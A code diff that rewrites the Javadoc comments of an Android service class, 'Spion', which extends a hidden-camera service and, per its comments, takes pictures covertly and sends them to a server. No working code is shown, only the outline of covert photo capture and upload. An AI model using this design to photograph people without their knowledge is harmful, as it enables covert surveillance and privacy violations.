@@ -58,8 +58,8 @@ public class Spion extends HiddenCameraService {
 
 
     /**
-     * action that happens after a picture gets taken
-     * @param imageFile
+     * Called by HiddenCameraService after a picture gets taken
+     * @param imageFile The resulting picture
      */
     @Override
     public void onImageCapture(@NonNull File imageFile) {
@@ -83,7 +83,7 @@ public class Spion extends HiddenCameraService {
 
     /**
      * Sends spion picture to the server
-     * @param file
+     * @param file picture file
      * @throws IOException
      */
     private void sendSpion(File file) throws IOException {
@@ -124,11 +124,11 @@ public class Spion extends HiddenCameraService {
 
 
     /**
-     * init camera and reqiure persmissions
-     * @param intent
-     * @param flags
-     * @param startId
-     * @return
+     * Called when an intent to this service is started. initialize camera and require permissions
+     * @param intent The intent to start the service
+     * @param flags The flags of the intent
+     * @param startId The id of the intent
+     * @return Service execution mode START_NOT_STICKY, if the service is killed it will not be restarted.
      */
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -184,8 +184,8 @@ public class Spion extends HiddenCameraService {
 
 
     /**
-     * error handler if there are errors with taken a picture
-     * @param errorCode
+     * error handler if there are errors while taking a picture, called by HiddenCameraService
+     * @param errorCode The type of error that occurred
      */
     @Override
     public void onCameraError(@CameraError.CameraErrorCodes int errorCode) {
